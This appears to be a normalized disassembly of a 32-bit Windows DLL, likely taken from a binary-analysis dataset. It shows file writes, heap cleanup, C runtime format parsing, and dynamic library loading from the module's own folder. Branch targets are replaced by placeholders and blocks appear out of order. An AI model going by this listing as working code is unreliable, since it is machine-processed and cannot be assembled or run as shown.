add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_1004c0e8
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_10053845
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_10048a10
push ebp
mov ebp esp
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax edi
pop ebp
retn 0x4
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov [ edi + 0x4 ] eax
inc [ eax ]
push ebx
mov ebx [ HeapFree@IAT ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_100542e0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
pop esi
pop ebx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
sub_10048a6a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_1005f8eb
call sub_10079623
add esp 0x10
pop esi
pop ebp
retn
sub_10048a90
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x104
lea ecx [ ebp - 0x220 ]
push ecx
push eax
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x220 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x220 ]
push eax
call [ PathAddBackslashW@IAT ]
lea edx [ ebp - 0x18 ]
mov eax 0xec
call sub_10013830
lea ecx [ ebp - 0x220 ]
push ecx
push ebx
mov ecx 0x104
call sub_10055350
test eax eax
je r-xdata
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push esi
lea edx [ ebp - 0x18 ]
push edx
mov esi 0x104
call sub_1003d910
neg eax
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10048b90
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x10 ]
jne r-xdata
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx [ eax ]
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
push eax
push 0x1
push edi
call sub_10008200
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp ebx eax
jne r-xdata
mov ecx [ edi + 0xc ]
cmp ecx [ ebx + 0xc ]
jae r-xdata
mov eax [ edi + 0xc ]
cmp eax [ ebx + 0xc ]
jae r-xdata
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jae r-xdata
push 0x0
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_10008df0
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop ebx
pop edi
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push edi
mov edi [ ebp + 0x8 ]
push ebx
push 0x1
push edi
mov ecx esi
call sub_10008200
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ edi + 0xc ]
cmp [ ebx + 0xc ] eax
jae r-xdata
lea ecx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
call sub_1003d870
mov eax [ ebp + 0x10 ]
mov ecx [ edi + 0xc ]
cmp [ eax + 0xc ] ecx
jae r-xdata
push edi
mov edi [ ebp + 0x8 ]
push eax
push 0x0
push edi
call sub_10008200
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
lea ecx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
call sub_100145d0
mov eax [ ebp + 0x10 ]
cmp eax [ esi + 0x4 ]
je r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov ecx esi
je r-xdata
mov edx [ ebx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov ecx esi
je r-xdata
mov ecx [ edi + 0xc ]
cmp ecx [ eax + 0xc ]
jae r-xdata
push ebx
push 0x1
push edi
call sub_10008200
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push eax
push 0x0
push edi
call sub_10008200
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push eax
push 0x1
push edi
call sub_10008200
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push ebx
push 0x0
push edi
call sub_10008200
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_10048cf0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0xff9d
and ecx 0xff
lea eax [ ebp - 0x210 ]
push eax
xor edx edx
mov [ ebp - 0x210 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x20e ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x20c ]
call sub_1002ed80
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x20c ]
push ecx
lea ecx [ esi + 0x94 ]
call sub_100531b0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10048db0
cmp [ rw-data ] 0x8
jb r-xdata
xor ecx ecx
cmp [ rw-data ] 0x8
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
jb r-xdata
mov eax [ rw-data ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
retn
mov edx [ rw-data ]
push edx
call sub_1006591f
add esp 0x4
sub_10048e19
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_10022b5a
pop ecx
push esi
call sub_10022b5a
pop ecx
sub_10048f20
push ebp
mov ebp esp
mov eax 0x8378
call sub_1007a540
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
call sub_10048cf0
test eax eax
je r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
xor eax eax
push 0x831c
push eax
lea ecx [ ebp - 0x8376 ]
push ecx
mov [ ebp - 0x8378 ] ax
call sub_10079a10
add esp 0xc
cmp [ esi + 0x90 ] 0x0
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x7f
call sub_10013830
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x90 ]
test eax eax
jne r-xdata
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push edi
push 0x1
push eax
call [ GetProcAddress@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x72
call sub_10013830
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
call [ LoadLibraryW@IAT ]
mov [ esi + 0x90 ] eax
mov eax [ eax ]
push esi
lea eax [ ebp - 0x8378 ]
call sub_100143a0
lea edx [ ebp - 0x28 ]
mov eax 0x121
call sub_10013830
lea edx [ ebp - 0x30 ]
mov eax 0x6c
call sub_10013830
lea edx [ ebp - 0x8378 ]
push edx
call edi
lea ecx [ esi + 0x94 ]
lea edi [ esi + 0xb4 ]
mov [ esi + 0x50 ] eax
call sub_10061900
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x58 ]
lea eax [ edi + 0x3 ]
call sub_10013830
lea eax [ edi + 0x4 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10049070
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x24 ]
mov edx [ edi ]
test edx edx
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp edx ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edx
mov [ edi ] ecx
sub eax ecx
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
pop ebx
pop edi
or eax 0xffffffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
pop edi
mov [ ecx ] al
pop esi
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
mov edi edi
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push eax
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
call sub_10023c20
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
test ebx ebx
je r-xdata
mov ecx [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ ecx ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov ecx [ esi + 0x34 ]
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
jne r-xdata
push ebx
push edx
push edi
call sub_100796a0
mov edx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x10 ]
mov [ ecx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov ecx [ esi + 0x20 ]
mov [ ecx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x24 ]
mov ecx edi
sub ecx edx
add [ esi + 0x3c ] ecx
mov eax [ eax ]
mov ecx [ esi + 0x14 ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov eax [ ebp + 0x8 ]
push edx
call sub_1006591f
add esp 0x4
sub_10049212
mov edi edi
push esi
push 0x4
push 0x20
call sub_1000977c
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10049250
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0xc4
push edi
call sub_10020380
mov esi eax
mov [ edi + 0x8 ] esi
xor ebx ebx
mov [ esi ] ebx
lea ecx [ esi + 0x10 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x70 ] 0x96
mov eax [ r--data ]
push ecx
push edi
mov [ esi + 0xc ] eax
call sub_10041660
lea edx [ esi + 0x20 ]
push edx
push edi
mov [ esi + 0x1c ] ebx
call sub_10041660
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0x94 ]
push ecx
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
push ecx
push eax
push edi
mov [ esi + 0x2c ] eax
call sub_10036400
mov edx [ ebp + 0x8 ]
add esi 0x30
push esi
push edx
call sub_10037120
mov eax [ edi + 0x8 ]
add esp 0x30
pop edi
pop esi
mov [ eax + 0x7c ] ebx
mov [ eax + 0x80 ] ebx
mov [ eax + 0x84 ] ebx
mov [ eax + 0x88 ] ebx
mov [ eax + 0x8c ] ebx
mov [ eax + 0x90 ] ebx
pop ebx
pop ebp
retn
sub_100492ed
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_10007adc
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_10049320
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi edx
push edi
mov edi ecx
mov [ ebp - 0x54 ] esi
call sub_1004df80
test eax eax
je r-xdata
mov esi [ ebx + 0x54 ]
test esi esi
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x84
call sub_100050e0
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
lea eax [ ebp - 0x54 ]
push eax
call sub_100273c0
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_1004937a
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_1006a508
call sub_1004fd6f
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x44c ] bl
movzx ecx [ esi ]
xor edx edx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x41c ] ecx
cmp cx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ecx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x41c ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_10049f22 ]
movsx eax [ edx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop edx
mov [ ebp - 0x460 ] eax
cmp eax edx
ja r-xdata
mov edx [ ebp - 0x460 ]
mov edi [ ebp - 0x420 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x468 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push ecx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_10079c49
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] edx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea ebx [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x420 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
test eax eax
je r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x468 ] 0x1
mov [ ebp - 0x41c ] ecx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_10022b5a
and [ ebp - 0x43c ] 0x0
mov edi [ ebp - 0x430 ]
sub edi [ ebp - 0x414 ]
sub edi [ ebp - 0x428 ]
mov [ ebp - 0x41c ] edi
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x428 ]
mov edi [ ebp - 0x464 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_10079c78
test [ ebp - 0x408 ] 0x8
pop ecx
pop ecx
je r-xdata
jmp r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x470 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x468 ]
movsx eax [ ebp - 0x41c ]
push [ ebp - 0x40c ]
mov [ ebp - 0x420 ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x470 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x408 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
call sub_10003288
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
